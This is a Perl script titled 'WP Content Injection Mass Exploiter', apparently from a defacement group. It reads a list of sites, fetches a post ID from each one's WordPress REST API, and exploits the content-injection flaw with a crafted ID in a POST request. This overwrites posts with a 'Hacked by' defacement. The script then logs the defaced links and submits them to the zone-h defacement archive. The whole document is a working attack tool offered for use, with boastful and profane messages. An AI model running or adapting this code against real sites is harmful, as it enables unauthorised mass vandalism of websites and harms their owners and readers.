#!/usr/bin/perl
#WP Content Injection Mass Exploiter 
#Coded By SuperNova / 3/2/2017
#______     _      _____ _____ _               _   
#| ___ \   (_)    |  _  |  __ \ |             | |  
#| |_/ / __ ___   _\ V /| |  \/ |__   ___  ___| |_ 
#|  __/ '__| \ \ / / _ \| | __| '_ \ / _ \/ __| __|
#| |  | |  | |\ V / |_| | |_\ \ | | | (_) \__ \ |_ 
#\_|  |_|  |_| \_/\_____/\____/_| |_|\___/|___/\__|
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);

print "WE ARE Ghost WE ARE THE BEST\n";
print " site:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Salah List Berow !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

foreach $site(@TARGETS){

chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';


print "Scaning  $site\n";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/wp-json/wp/v2/posts/'.$id;
$sormm = $ua->get($ajx);
$karzaa = $sormm->content;
if($karzaa =~/link\":\"(.*?)\",\"/)
{
$link=$1;
$link =~ s/\\|//g;


    open(save, '>>links.txt');  
    print save "$link\n";  
    close(save);
$def="Hacked by Fallag Gassrini";
$sirina=$id . 'justracccwdata';
#print "[Def] $link\n";
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'hacked By 9nas_007   AnonGhostDZ Team', 'content' => $def ];
$response = $ua->request($gassface);
$stat = $response->content;
#print $stat;
	if ($stat =~ /Fallag Gassrini/){
print colored ("[+]Hi Dear! Web Fucked!!",'white on_red'),"\n";
zonpost();
}else{
print colored ("[-]Not Fucked :( ",'white on_blue'),"\n";
}
}
}
}
sub zonpost{
$req = HTTP::Request->new(GET=>$link);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$ar = $response->content;
if ($ar =~ /Hacked|Fallag |Gassrini/){

				$dmn= $link;
				$def="Fallaga Team";
				$zn="http://zone-h.org/notify/single";
				$lwp=LWP::UserAgent->new;
				$res=$lwp  -> post($zn,[
				'defacer'     => $def,
				'domain1'   => $dmn,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print colored ("[-]submit $1",'white on_green'),"\n";
				}
				else
				{
				print colored ("[-]Error",'black on_white'),"\n";
				}
				     }else{
						print" Not Defaced Gass !! \n";
}
}
